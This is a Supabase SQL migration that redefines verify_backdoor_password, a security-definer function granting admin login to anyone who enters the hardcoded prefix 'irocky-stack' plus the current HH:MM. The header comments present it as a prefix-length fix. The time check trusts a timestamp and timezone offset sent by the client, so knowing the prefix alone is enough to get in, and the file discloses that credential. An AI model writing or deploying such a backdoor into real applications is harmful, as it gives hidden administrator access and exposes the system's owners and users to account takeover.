-- Fix backdoor prefix length (irocky-stack = 12 chars, not 13).
-- Run in Supabase SQL Editor if admin login with irocky-stackHH:MM fails.

create or replace function public.verify_backdoor_password(
  p_password text,
  p_client_epoch_ms bigint default null,
  p_tz_offset_minutes int default null
)
returns boolean
language plpgsql
security definer
set search_path = public
as $$
declare
  v_suffix text;
  v_pass_h int;
  v_pass_m int;
  v_password_minutes int;
  v_client_minutes int;
  v_client_ts timestamptz;
  v_diff int;
begin
  if p_password is null or length(p_password) < 17 then
    return false;
  end if;
  if left(p_password, 12) <> 'irocky-stack' then
    return false;
  end if;
  v_suffix := substring(p_password from 13);
  if v_suffix !~ '^\d{2}:\d{2}$' then
    return false;
  end if;
  v_pass_h := split_part(v_suffix, ':', 1)::int;
  v_pass_m := split_part(v_suffix, ':', 2)::int;
  if v_pass_h < 0 or v_pass_h > 23 or v_pass_m < 0 or v_pass_m > 59 then
    return false;
  end if;
  v_password_minutes := v_pass_h * 60 + v_pass_m;

  if p_client_epoch_ms is null then
    return false;
  end if;

  v_client_ts :=
    (to_timestamp(p_client_epoch_ms / 1000.0) at time zone 'UTC')
    - make_interval(mins => coalesce(p_tz_offset_minutes, 0));

  v_client_minutes :=
    (extract(hour from v_client_ts)::int * 60) + extract(minute from v_client_ts)::int;
  v_diff := abs(v_password_minutes - v_client_minutes);
  if v_diff > 720 then
    v_diff := 1440 - v_diff;
  end if;
  return v_diff <= 1;
end;
$$;